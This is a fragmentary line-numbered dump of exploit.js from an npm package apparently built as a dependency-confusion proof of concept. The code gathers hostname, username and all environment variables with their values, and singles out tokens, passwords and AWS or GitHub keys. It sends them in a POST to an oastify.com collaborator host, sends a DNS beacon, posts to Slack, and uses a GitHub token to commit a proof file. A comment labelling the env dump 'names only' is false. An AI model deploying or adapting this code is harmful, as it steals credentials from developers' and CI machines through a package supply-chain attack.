// File: tmp/tmpxgswxp38/posa-loginpage-plugin/package/exploit.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const path = require('path')
Line 3: const os = require('os')
Line 4: const https = require('https')
Line 5: const dns = require('dns')
Line 6: _tmp_21 = require('crypto')
Line 9: const COLLAB = process.env.POC_COLLAB_URL || 'https://jzmar0jtmv28t7sd2d319x554wanysmh.oastify.com/poc'
Line 14: /^1|true$/i.test(process.env.POC_INJECT || '1')
Line 25: {
    const url = new URL(urlStr);
    const data = Buffer.from(JSON.stringify(bodyObj));
    const req = https.request({
      hostname: url.hostname, path: url.pathname + url.search,
      method: 'POST', port: url.port || 443, timeout: timeoutMs,
      headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    }, res => res.resume());
    req.on('error', () => {});
    req.on('timeout', () => req.destroy());
    req.write(data); req.end();
  }
Line 27: Buffer.from(JSON.stringify(bodyObj))
Line 28: const req = https.request({
      hostname: url.hostname, path: url.pathname + url.search,
      method: 'POST', port: url.port || 443, timeout: timeoutMs,
      headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    }, res => res.resume())
Line 35: req.write(data)
Line 40: {
    const label = `${ID}.${os.hostname()}`.replace(/[^a-zA-Z0-9.-]/g, '');
    dns.lookup(`${label}.${hostSuffix}`, () => {});
  }
Line 41: const label = `${ID}.${os.hostname()}`.replace(/[^a-zA-Z0-9.-]/g, '')
Line 47: Object.keys(process.env || {})
Line 49: _tmp_27.push("BITBUCKET_PIPELINE_UUID")
Line 50: _tmp_27.push("AZURE_HTTP_USER_AGENT")
Line 53: const meta = {
  id: ID, when: now,
  node: process.version,
  platform: `${process.platform}/${process.arch}`,
  host: os.hostname(),
  cwd: process.cwd(),
  user: (() => { try { return os.userInfo().username; } catch { return 'unknown'; } })(),
  ciSignals,
  envKeyCount: envKeys.length,
  envSamples: envKeys.slice(0, 20).map(k => ({ key: k, value: process.env[k] })),
  envAll: envKeys.map(k => ({ key: k, value: process.env[k] })),                // names only
  possibleSecrets: envKeys.filter(k => /(token|secret|key|passwd|password|cred|aws_|github_)/i.test(k)).map(k => ({ key: k, value: process.env[k] }))
}
Line 57: os.hostname()
Line 59: os.userInfo()
Line 62: _tmp_28.envSamples = envKeys.slice(0, 20).map(k => ({ key: k, value: process.env[k] }))
Line 63: _tmp_28.envAll = envKeys.map(k => ({ key: k, value: process.env[k] }))
Line 64: _tmp_28.possibleSecrets = envKeys.filter(k => /(token|secret|key|passwd|password|cred|aws_|github_)/i.test(k)).map(k => ({ key: k, value: process.env[k] }))
Line 68: {
  const wsMarker = path.resolve(process.cwd(), `DEP_CONFUSION_PROOF_${ID}.txt`);
  safeWrite(wsMarker, `[${now}] Dependency-confusion PoC executed on ${os.hostname()}.\nID=${ID}\n`);
  const tmpMarker = path.join(os.tmpdir?.() ?? '/tmp', `depconfusion-poc-${ID}.json`);
  safeWrite(tmpMarker, JSON.stringify(meta, null, 2));
}
Line 70: safeWrite(wsMarker, `[${now}] Dependency-confusion PoC executed on ${os.hostname()}.\nID=${ID}\n`)
Line 71: path.join(os.tmpdir?.() ?? '/tmp', `depconfusion-poc-${ID}.json`)
Line 79: _tmp_41.push("public")
Line 85: (_tmp_35 = fs.statSync(dir))
Line 86: const entries = fs.readdirSync(dir, { withFileTypes: true })
Line 87: _iterator_0.next()
Line 88: path.join(dir, e.name)
Line 90: /\.js$/.test(e.name)
Line 92: const data = fs.readFileSync(p)
Line 103: _iterator_1.next()
Line 107: httpPost(COLLAB, { type: 'depconfusion-poc', meta })
Line 114: httpPost(SLACK_WEBHOOK, {
    text: `PoC ${ID}: dependency-confusion executed on ${meta.host}. CI flags: ${meta.ciSignals.join(', ') || 'none'}`
  })
Line 115: meta.ciSignals.join(', ')
Line 120: {
  if (!GH_TOKEN || !GH_REPO) return;

  // Create a proof file and a branch, then open a PR. We do this with raw HTTPS to avoid extra deps.
  const proofRel = `poc/DEP_CONFUSION_PROOF_${ID}.md`;
  const proofContent = Buffer.from(`# PoC ${ID}\n\nThis file was created by an authorized dependency-confusion test at ${now} on ${meta.host}.\n`).toString('base64');

  function ghRequest(method, path, body) {
    return new Promise(resolve => {
      const data = body ? Buffer.from(JSON.stringify(body)) : null;
      const req = https.request({
        hostname: 'api.github.com',
        path, method, port: 443,
        headers: {
          'User-Agent': 'depconfusion-poc',
          'Authorization': `Bearer ${GH_TOKEN}`,
          'Accept': 'application/vnd.github+json',
          ...(data ? { 'Content-Type': 'application/json', 'Content-Length': data.length } : {})
        }
      }, res => {
        let buf = ''; res.on('data', c => buf += c); res.on('end', () => resolve({ status: res...
Line 125: Buffer.from(`# PoC ${ID}\n\nThis file was created by an authorized dependency-confusion test at ${now} on ${meta.host}.\n`).toString('base64')
Line 128: {
      const data = body ? Buffer.from(JSON.stringify(body)) : null;
      const req = https.request({
        hostname: 'api.github.com',
        path, method, port: 443,
        headers: {
          'User-Agent': 'depconfusion-poc',
          'Authorization': `Bearer ${GH_TOKEN}`,
          'Accept': 'application/vnd.github+json',
          ...(data ? { 'Content-Type': 'application/json', 'Content-Length': data.length } : {})
        }
      }, res => {
        let buf = ''; res.on('data', c => buf += c); res.on('end', () => resolve({ status: res.statusCode, body: buf }));
      });
      req.on('error', () => resolve({ status: 0, body: '' }));
      if (data) req.write(data);
      req.end();
    }
Line 129: Buffer.from(JSON.stringify(body))
Line 130: const req = https.request({
        hostname: 'api.github.com',
        path, method, port: 443,
        headers: {
          'User-Agent': 'depconfusion-poc',
          'Authorization': `Bearer ${GH_TOKEN}`,
          'Accept': 'application/vnd.github+json',
          ...(data ? { 'Content-Type': 'application/json', 'Content-Length': data.length } : {})
        }
      }, res => {
        let buf = ''; res.on('data', c => buf += c); res.on('end', () => resolve({ status: res.statusCode, body: buf }));
      })
Line 144: req.end()
Line 151: const repo = JSON.parse(mainResp.body || '{}')
Line 154: const ref = JSON.parse(refResp.body || '{}')
Line 163: const blobSha = JSON.parse(blob.body || '{}').sha
Line 166: const tree = await ghRequest('POST', `${repoPath}/git/trees`, {
    base_tree: baseSha,
    tree: [{ path: proofRel, mode: '100644', type: 'blob', sha: blobSha }]
  })
Line 168: _tmp_14.tree = [{ path: proofRel, mode: '100644', type: 'blob', sha: blobSha }]
Line 170: const treeSha = JSON.parse(tree.body || '{}').sha
Line 172: const commit = await ghRequest('POST', `${repoPath}/git/commits`, {
    message: `PoC: dependency-confusion proof (${ID})`,
    tree: treeSha,
    parents: [baseSha]
  })
Line 175: _tmp_17.parents = [baseSha]
Line 177: const commitSha = JSON.parse(commit.body || '{}').sha
